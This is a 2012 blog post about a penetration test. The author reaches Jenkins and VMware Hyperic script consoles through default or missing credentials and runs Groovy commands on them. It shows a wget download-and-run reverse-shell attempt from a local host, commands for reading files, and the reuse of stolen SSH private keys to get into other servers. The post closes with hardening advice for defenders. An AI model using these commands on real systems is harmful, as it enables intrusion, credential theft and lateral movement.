---
layout: post
title: One Groovy Pentest
date: 2012-07-31 18:42:05.000000000 -04:00
type: post
published: true
status: publish
categories:
- Code
- Pentest
tags:
- groovy
- penetration testing
- Pentesting
meta:
  _edit_last: '20119316'
  _wpas_done_twitter: '1'
  _wpas_skip_linkedin: '1'
author:
  login: averagesecurityguy
  email: stephen@averagesecurityguy.info
  display_name: averagesecurityguy
  first_name: ''
  last_name: ''
---
<h3 style="color:#ff0000;">Update:</h3>
<p style="color:#ff0000;">The original post said that I had gained unauthenticated access to a Hudson server. In fact, I had gained access to a VMware Hyperic server using the default credentials of hqadmin/hqadmin. Hudson is probably vulnerable as well but I do not know. If you can confirm the problem exists in Hudson as well, let me know in the comments.</p>
<p>On penetration tests it is my habit to find web servers and see what I can access using either default credentials or in some cases no credentials. On my last two penetration tests I gained unauthenticated access to project management servers, <del datetime="2012-08-02T14:44:43+00:00">one was <a href="http://hudson-ci.org/" title="Hudson project management server" target="_blank">Hudson</a></del> and the other <a href="http://jenkins-ci.org/" title="Jenkins project management server" target="_blank">Jenkins</a>. Both of these project management systems include a web-based console that allows you to execute <a href="http://groovy.codehaus.org/" title="Groovy programming language" target="_blank">Groovy</a> code. After a little research, I found that Groovy allows you to run system commands using the syntax <code>["command", "arg1", "arg2"].execute()</code>. The output of the command can be accessed using <code>println</code>.</p>
<p>With both servers I attempted to get a reverse shell by using the following commands:</p>
<pre>
["wget", "http://192.168.1.1/shell.py", "-O", "/tmp/shell.py"].execute()
["python", "/tmp/shell.py"].execute()
</pre>
<p>This did not work on either server. I then used <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" title="pentestmonkey reverse shell cheat sheet" target="_blank">pentestmonkey's list of reverse shell one liners</a> to attempt to get a reverse shell working with ruby, bash, and perl. Again, nothing worked. Since I couldn't get a shell going, I decided to look around the server to see what data was available. I used the following commands:</p>
<pre>
# To list files
proc = ["ls", "-al", "/path/to/list"].execute()
println proc.in.text

# To cat a file
proc = ["cat", "/file/to/cat"].execute()
println proc.in.text
</pre>
<p>On the Jenkins server, I was able to access the .ssh folder of the jenkins user. This server contained private RSA keys, which I was able to feed into the Metasploit auxiliary module <code>auxiliary/ssh/ssh_login_pubkey</code> and gain access to three other servers.</p>
<p>If you are using a project management server such as Hudson or Jenkins ensure all unauthenticated access to the server is disabled. If you are a Penetration Tester, always check the web server running on the client's networks; you never know what you will find. You can use my <a href="http://averagesecurityguy.info/2012/07/05/low-hanging-fruit/" title="Low Hanging Fruit python script">low hanging fruit script</a> to find active web servers.</p>
